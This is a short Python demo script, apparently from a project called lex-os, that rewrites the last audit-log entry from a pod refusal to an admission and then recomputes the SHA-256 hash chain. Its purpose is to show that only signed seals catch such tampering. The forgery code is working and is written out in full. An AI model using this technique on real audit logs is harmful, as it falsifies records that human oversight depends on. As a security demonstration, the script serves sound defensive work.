"""Rewrite a refusal into an admission, and rebuild the hash chain.

This is the attack `lex-os#54`'s seals exist to stop, written out so the
demo can run it rather than describe it. It needs no key and no
privilege — only the ability to read and write the file, which is what
anyone with the pod's `/audit` volume has.

The chain does not stop it. The hashes are *derived* from the contents,
so recomputing them after an edit is free, and what comes out is a
well-formed chain saying whatever the forger wanted. The seals are the
part that cannot be recomputed.

    python3 demo/forge-verdict.py decision.json forged.json
"""

import hashlib
import json
import sys

DOMAIN = b"lex.k8s.audit.v1"
GENESIS = "0" * 64


def entry_hash(seq: int, prev: str, event: dict) -> str:
    h = hashlib.sha256()
    h.update(DOMAIN)
    h.update(seq.to_bytes(8, "big"))
    h.update(prev.encode())
    # serde_json's compact form, and no \\u escaping — the bytes have to
    # match what the library hashed or the forgery is detectable for the
    # wrong reason.
    h.update(json.dumps(event, separators=(",", ":"), ensure_ascii=False).encode())
    return h.hexdigest()


src, dst = sys.argv[1], sys.argv[2]
entries = json.load(open(src))

last = entries[-1]
if last["event"]["kind"] != "pod_refused":
    sys.exit(f"expected the last entry to be a refusal, found {last['event']['kind']}")

# The edit: a refusal becomes an admission.
last["event"] = {
    "kind": "pod_admitted",
    "uid": last["event"]["uid"],
    "artifact_sha256": last["event"]["artifact_sha256"],
    "manifest": last["event"]["manifest"],
    "subject": last["event"]["subject"],
}

# The rebuild, which is what makes the edit invisible to the chain.
prev = GENESIS
for e in entries:
    e["prev_hash"] = prev
    e["hash"] = prev = entry_hash(e["seq"], prev, e["event"])
    # The seals come along unchanged — the forger has them, they were in
    # the file. They are now signatures over hashes that no longer exist.

json.dump(entries, open(dst, "w"), indent=2)
print(f"rewrote the verdict and recomputed {len(entries)} hashes")
